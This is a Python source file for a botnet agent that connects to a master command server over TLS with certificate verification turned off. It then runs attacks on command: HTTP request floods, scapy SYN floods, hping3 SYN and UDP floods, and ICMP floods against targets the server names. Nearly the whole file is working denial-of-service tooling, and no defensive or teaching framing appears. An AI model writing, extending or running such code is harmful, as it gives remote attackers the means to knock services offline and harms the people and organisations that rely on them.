import socket
import ssl
import requests
import time
import logging
from scapy.all import *
import threading
import subprocess

# Constants for the server
MASTER_DOMAIN = 'master_bot_IP' # here the IP for master bot
MASTER_PORT = 5000

# Event to manage stopping of attacks
stop_attack_event = threading.Event()

# Global variable to hold the current attack thread
attack_thread = None

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def execute_ddos(target_url):
    """ Simulate a DDoS attack by sending requests to a target URL. """
    while not stop_attack_event.is_set():
        try:
            response = requests.get(target_url)
            print(f"Pinged {target_url} with response code: {response.status_code}")
            time.sleep(1)
        except requests.exceptions.RequestException as e:
            print(f"Error during DDoS simulation: {e}")
            time.sleep(10)

def send_syn_packet(target_ip, target_port):
    """Send SYN packets to a target IP and port."""
    try:
        packet = IP(dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags='S')
        send(packet, verbose=False)
        logging.info(f"SYN packet sent to {target_ip}:{target_port}")
    except Exception as e:
        logging.error(f"Error sending SYN packet: {e}")

def execute_syn_flood(target_ip, target_port, duration=None):
    """Flood a target with SYN packets for a specified duration."""
    start_time = time.time()
    while not stop_attack_event.is_set() and (duration is None or time.time() - start_time < duration):
        send_syn_packet(target_ip, target_port)

def execute_hping3(target_ip, target_port):
    """Use hping3 to perform a SYN flood."""
    command = ['hping3', '-S', '--flood', '-p', str(target_port), target_ip]
    try:
        subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        logging.info(f"hping3 SYN flood attack initiated on {target_ip}:{target_port}")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to execute hping3: {e.stderr.decode()}")

def execute_hping3_udp_flood(target_ip, target_port):
    """ Use hping3 to perform a UDP flood. """
    command = ['hping3', '--udp', '--flood', '-p', str(target_port), target_ip]
    subprocess.run(command, check=True)

def execute_icmp_flood(target_ip, duration=10):
    """ Flood a target with ICMP packets. """
    packet = IP(dst=target_ip)/ICMP()  # Pre-create the packet to send
    while not stop_attack_event.is_set():
        send(packet, verbose=0)

def connect_to_master_and_listen():
    """ Connect to the master server and listen for commands. """
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    with socket.create_connection((MASTER_DOMAIN, MASTER_PORT)) as sock:
        with context.wrap_socket(sock, server_hostname=MASTER_DOMAIN) as ssock:
            print(f"Connected securely to master bot at {MASTER_DOMAIN}")

            while True:
                data = ssock.recv(1024).decode('utf-8')
                if not data:
                    continue  # Keep the connection alive unless explicitly told to close

                if data.startswith("EXECUTE_APP_LAYER_ATTACK"):
                    target_url = data.split()[1]
                    attack_thread = threading.Thread(target=execute_ddos, args=(target_url,))
                    attack_thread.start()

                elif data.startswith("EXECUTE_SYN_FLOOD_ATTACK"):
                    target_ip = data.split()[1]
                    target_port = int(data.split()[2])
                    attack_thread = threading.Thread(target=execute_syn_flood, args=(target_ip, target_port))
                    attack_thread.start()

                elif data.startswith("EXECUTE_HPING3_ATTACK"):
                    target_ip = data.split()[1]
                    target_port = int(data.split()[2])
                    attack_thread = threading.Thread(target=execute_hping3, args=(target_ip, target_port))
                    attack_thread.start()

                elif data.startswith("EXECUTE_UDP_FLOOD_ATTACK"):
                    target_ip = data.split()[1]
                    target_port = int(data.split()[2])
                    attack_thread = threading.Thread(target=execute_hping3_udp_flood, args=(target_ip, target_port))
                    attack_thread.start()

                elif data.startswith("EXECUTE_ICMP_ATTACK"):
                    target_ip = data.split()[1]
                    attack_thread = threading.Thread(target=execute_icmp_flood, args=(target_ip,))
                    attack_thread.start()

                elif data == "STOP_DDoS":
                    print("Received stop command.")
                    stop_attack_event.set()
                    if attack_thread is not None:
                        attack_thread.join()  # Wait for the attack to stop
                    stop_attack_event.clear()  # Reset the event for future attacks

if __name__ == "__main__":
    connect_to_master_and_listen()
